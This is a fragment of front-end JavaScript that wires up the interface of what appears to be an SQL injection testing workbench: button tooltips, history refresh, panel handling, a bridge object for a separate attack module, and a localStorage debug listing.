      const hint = (id) => formatShortcut(shortcuts[id] || {});
      const np = $('#navPayloadBtn'); if (np) np.title = 'Payload (' + hint('openPayload') + ')';
      const nh = $('#navHistoryBtn'); if (nh) nh.title = 'History (' + hint('openHistory') + ')';
      const nc = $('#navToolsBtn'); if (nc) nc.title = 'Tools (' + hint('openTools') + ')';
      const ns = $('#navSettingsBtn'); if (ns) ns.title = 'Settings (' + hint('openSettings') + ')';
      setInterval(() => {
        if (state.history.length && !state.attack.active) renderHistory();
      }, 30000);

      bindPanelPopoutButtons();
      bindPayloadToolsMenu();
      bindPayloadDraftSync();
      bindTargetUrlSync();
      bindCrossTabSync();
      bindHistResponseUI();
      syncTopbarHeight();
      window.addEventListener('resize', syncTopbarHeight);
      if (isSoloSettings) enterSoloPanelMode('settings');
      if (isSoloPayload) enterSoloPanelMode('payload');
      if (isSoloHistory) enterSoloPanelMode('history');
      if (typeof window.initProxy === 'function') window.initProxy();
      // Solo mode hides top-bar — re-sync so drawers/full panels use correct offset
      syncTopbarHeight();
    }
    // Close-cluster: after action click, collapse until mouse leaves
    (function bindCloseClusterForceClose() {
      document.addEventListener('click', (e) => {
        const btn = e.target && e.target.closest && e.target.closest('.vpanel-close-cluster .vpanel-action-btn');
        if (!btn) return;
        const cluster = btn.closest('.vpanel-close-cluster');
        if (!cluster) return;
        cluster.classList.add('force-closed');
        const unlock = () => {
          cluster.classList.remove('force-closed');
          cluster.removeEventListener('mouseleave', unlock);
        };
        cluster.addEventListener('mouseleave', unlock);
      }, true);
    })();


    // Bridge for attack.js module
    window.__sqli = {
      state: state,
      $: $,
      $$: $$,
      get payloadInput() { return payloadInput; },
      get methodSelect() { return methodSelect; },
      get urlInput() { return urlInput; },
      get postBodyInput() { return postBodyInput; },
      get sendBtn() { return sendBtn; },
      get historyStatusFilter() { return historyStatusFilter; },
      get vpanelBackdrop() { return vpanelBackdrop; },
      get urlProgressBar() { return urlProgressBar; },
      get attackProgressLabel() { return attackProgressLabel; },
      get pauseBtn() { return pauseBtn; },
      get stopBtn() { return stopBtn; },
      showToast: showToast,
      escapeHtml: escapeHtml,
      executeOneRequest: executeOneRequest,
      buildRequestHeaders: buildRequestHeaders,
      displayResponse: displayResponse,
      renderHistory: renderHistory,
      ensureAttackFilterOption: ensureAttackFilterOption,
      closeVPanel: closeVPanel,
      openVPanel: openVPanel,
      setPayloadCollapsed: (typeof setPayloadCollapsed === 'function') ? setPayloadCollapsed : null,
    };
    if (typeof window.__bootAttack === 'function') window.__bootAttack();

    window.openVPanel = openVPanel;
    window.formatBytes = formatBytes;
    window.showToast = showToast;
    if (typeof escapeHtml === 'function') window.escapeHtml = escapeHtml;

    // Debug: list all SQLlix localStorage keys
    window.__sqliListStorage = function () {
      const keys = [];
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (!k) continue;
        if (/sqli|sqllix|workbench/i.test(k)) {
          let size = 0;
          try { size = (localStorage.getItem(k) || '').length; } catch (e) {}
          keys.push({ key: k, chars: size });
        }
      }
      console.table(keys);
      return keys;
    };

    init();
